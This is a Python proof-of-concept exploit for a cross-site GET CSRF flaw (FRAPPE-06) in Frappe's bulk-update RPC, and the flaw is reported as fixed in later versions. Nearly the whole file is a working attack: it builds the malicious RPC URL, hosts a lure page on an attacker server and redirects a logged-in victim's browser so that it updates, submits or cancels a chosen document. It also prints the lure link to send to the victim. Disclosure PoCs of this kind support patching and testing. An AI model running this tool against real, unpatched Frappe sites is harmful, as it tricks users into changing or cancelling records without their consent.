#!/usr/bin/env python3
"""Frappe bulk-update GET CSRF (FRAPPE-06).

Frappe's bulk-action RPC
`frappe.desk.doctype.bulk_update.bulk_update.submit_cancel_or_update_docs` is
reachable over GET and state-changing, so a top-level cross-site navigation the
victim's browser makes carries their session cookie and needs no CSRF token. A
logged-in user who follows an attacker link can be made to update, submit or
cancel a document they are permitted to change.

This client hosts a lure that redirects the victim's click to the crafted RPC URL
and waits for the redirect. The same-origin policy hides the response, so verify
the effect on the target document itself. Reviewed against Frappe Framework
16.29.0.

Fix status: fixed in Frappe 16.30.0 / 15.117.0, which restrict the bulk-update
method to POST and require a CSRF token.
"""

from __future__ import annotations

import argparse
import html
import json
import os
import re
import secrets
import ssl
import sys
import threading
import urllib.parse
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


METHOD = "frappe.desk.doctype.bulk_update.bulk_update.submit_cancel_or_update_docs"
FIELD_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
REQUEST_URL_WARNING_LIMIT = 4000


class PocError(RuntimeError):
    pass


# --- terminal UI ---
_BANNER = r"""
 _____ ____      _    ____  ____  _____
|  ___|  _ \    / \  |  _ \|  _ \| ____|
| |_  | |_) |  / _ \ | |_) | |_) |  _|
|  _| |  _ <  / ___ \|  __/|  __/| |___
|_|   |_| \_\/_/   \_\_|   |_|   |_____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color() -> None:
    global _COLOR
    _COLOR = False


def banner(subtitle: str) -> None:
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg: str) -> None:
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg: str) -> None:
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg: str) -> None:
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg: str) -> None:
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def rule() -> None:
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
# --- end terminal UI ---


def normalize_origin(value: str, label: str) -> str:
    value = value.strip().rstrip("/")
    try:
        parsed = urllib.parse.urlsplit(value)
        _ = parsed.port
    except ValueError as exc:
        raise PocError(f"invalid {label}: {exc}") from exc
    scheme = parsed.scheme.lower()
    if scheme not in {"http", "https"} or not parsed.hostname:
        raise PocError(f"{label} must be an http(s) origin")
    if parsed.username or parsed.password:
        raise PocError(f"{label} must not contain userinfo")
    if parsed.path not in {"", "/"} or parsed.query or parsed.fragment:
        raise PocError(f"{label} must not contain a path, query, or fragment")
    host = parsed.hostname.lower()
    if ":" in host:
        host = f"[{host}]"
    port = parsed.port
    default_port = 80 if scheme == "http" else 443
    netloc = host if port in {None, default_port} else f"{host}:{port}"
    return f"{scheme}://{netloc}"


def check_cross_site_inputs(target: str, public_url: str) -> None:
    target_host = (urllib.parse.urlsplit(target).hostname or "").lower()
    public_host = (urllib.parse.urlsplit(public_url).hostname or "").lower()
    if target_host == public_host:
        raise PocError("--public-url and --url must use different hostnames")


def parse_value(args: argparse.Namespace) -> object:
    if args.value_json is not None:
        try:
            return json.loads(args.value_json)
        except json.JSONDecodeError as exc:
            raise PocError(f"--value-json is not valid JSON: {exc}") from exc
    if args.value is not None:
        return args.value
    raise PocError("update requires --value or --value-json")


def exploit_url(
    target: str,
    doctype: str,
    docname: str,
    action: str,
    fieldname: str | None = None,
    value: object = None,
) -> str:
    params: dict[str, str] = {
        "doctype": doctype,
        "docnames": json.dumps([docname], ensure_ascii=True, separators=(",", ":")),
        "action": action,
    }
    if action == "update":
        assert fieldname is not None
        params["data"] = json.dumps(
            {fieldname: value}, ensure_ascii=True, separators=(",", ":")
        )
    query = urllib.parse.urlencode(
        params,
        quote_via=urllib.parse.quote,
    )
    return target + "/api/method/" + METHOD + "?" + query


@dataclass
class State:
    public_url: str
    token: str
    exploit_url: str
    navigation_event: threading.Event = field(default_factory=threading.Event)

    @property
    def lure_url(self) -> str:
        return self.public_url + "/?token=" + urllib.parse.quote(self.token)

    @property
    def go_path(self) -> str:
        return "/go?token=" + urllib.parse.quote(self.token)


class AttackServer(ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, address, state: State):  # noqa: ANN001
        self.state = state
        super().__init__(address, AttackHandler)


class AttackHandler(BaseHTTPRequestHandler):
    server: AttackServer

    def do_GET(self) -> None:
        parsed = urllib.parse.urlsplit(self.path)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if params.get("token") != [self.server.state.token]:
            self.send_error(404)
            return
        if parsed.path == "/":
            body = (
                "<!doctype html><meta charset='utf-8'><title>Document link</title>"
                "<h1>Document link</h1><p>Open the requested document operation.</p>"
                f"<p><a id='frappe06-trigger' href='{html.escape(self.server.state.go_path, quote=True)}'>"
                "Continue</a></p>"
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)
            return
        if parsed.path == "/go":
            self.send_response(302)
            self.send_header("Location", self.server.state.exploit_url)
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", "0")
            self.end_headers()
            self.wfile.flush()
            self.server.state.navigation_event.set()
            return
        self.send_error(404)

    def log_message(self, format: str, *args) -> None:  # noqa: A002, ANN002
        return


def wait_for_target_redirect(state: State, wait_seconds: float) -> None:
    if not state.navigation_event.wait(wait_seconds):
        raise PocError(
            f"no target redirect requested within {wait_seconds:g} seconds"
        )


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n"
               "  %(prog)s --url https://frappe.example \\\n"
               "    --public-url https://attacker.example --listen-port 8000 \\\n"
               "    --doctype 'Web Page' --docname about --action update \\\n"
               "    --field title --value 'Maintenance'\n",
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe site origin")
    parser.add_argument("--public-url", required=True, metavar="URL", help="attacker origin on a different site")
    parser.add_argument("--listen-host", default="0.0.0.0", metavar="HOST", help="attacker-server bind address (default: 0.0.0.0)")
    parser.add_argument("--listen-port", type=int, default=8000, metavar="PORT", help="attacker-server port (default: 8000)")
    parser.add_argument("--certfile", metavar="PATH", help="optional attacker-server TLS certificate; omit when a tunnel or proxy terminates TLS")
    parser.add_argument("--keyfile", metavar="PATH", help="optional attacker-server TLS private key; pair with --certfile")
    parser.add_argument("--doctype", required=True, metavar="DOCTYPE", help="target DocType")
    parser.add_argument("--docname", required=True, metavar="NAME", help="target document name")
    parser.add_argument(
        "--action", choices=("update", "submit", "cancel"), default="update", help="bulk action (default: update)"
    )
    parser.add_argument("--field", metavar="FIELD", help="field to change when --action=update")
    value = parser.add_mutually_exclusive_group()
    value.add_argument("--value", metavar="VALUE", help="string value for --action=update")
    value.add_argument("--value-json", metavar="JSON", help="JSON value such as true or 1")
    parser.add_argument(
        "--wait-seconds",
        type=float,
        default=300.0,
        metavar="SECS",
        help="seconds to wait for the target redirect (default: 300)",
    )
    parser.add_argument("--no-color", action="store_true", help="disable coloured output")
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("bulk-update cross-site GET CSRF  ·  FRAPPE-06")
    if args.wait_seconds <= 0:
        raise PocError("--wait-seconds must be greater than zero")
    if not 1 <= args.listen_port <= 65535:
        raise PocError("--listen-port must be between 1 and 65535")
    if bool(args.certfile) != bool(args.keyfile):
        raise PocError("--certfile and --keyfile must be supplied together")
    if not args.doctype or not args.docname:
        raise PocError("--doctype and --docname must be nonempty")
    if args.action == "update":
        if not args.field or not FIELD_RE.fullmatch(args.field):
            raise PocError("update requires a valid Frappe field name in --field")
        value = parse_value(args)
    else:
        if args.field is not None or args.value is not None or args.value_json is not None:
            raise PocError(f"--field and value options do not apply to {args.action}")
        value = None
    args.url = normalize_origin(args.url, "--url")
    public_url = normalize_origin(args.public_url, "--public-url")
    check_cross_site_inputs(args.url, public_url)
    public_scheme = urllib.parse.urlsplit(public_url).scheme
    if public_scheme != "https" and args.certfile:
        raise PocError("TLS certificate options require an HTTPS --public-url")

    attack = exploit_url(
        args.url,
        args.doctype,
        args.docname,
        args.action,
        args.field,
        value,
    )
    if len(attack) > REQUEST_URL_WARNING_LIMIT:
        warn("exploit URL exceeds 4000 bytes and may hit request-line limits")
    state = State(public_url, secrets.token_urlsafe(18), attack)
    try:
        server = AttackServer((args.listen_host, args.listen_port), state)
    except OSError as exc:
        raise PocError(f"could not listen on {args.listen_host}:{args.listen_port}: {exc}") from exc
    if args.certfile:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        try:
            context.load_cert_chain(args.certfile, args.keyfile)
        except (OSError, ssl.SSLError) as exc:
            server.server_close()
            raise PocError(f"could not load the TLS certificate/key: {exc}") from exc
        server.socket = context.wrap_socket(server.socket, server_side=True)
    elif public_scheme == "https":
        warn(
            "serving plain HTTP on the listen port; front --public-url with a TLS "
            "terminator such as an ngrok or cloudflared tunnel or a reverse proxy"
        )
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        info(f"target action: {args.action} {args.doctype}/{args.docname}")
        good("lure ready — send this URL to the logged-in victim:")
        rule()
        print(state.lure_url, flush=True)
        info(f"waiting up to {args.wait_seconds:g}s for the victim to follow it")
        wait_for_target_redirect(state, args.wait_seconds)
        good("victim followed the lure; redirect sent to the Frappe endpoint")
        warn("the attacker origin cannot read the response; inspect the target document")
        return 0
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
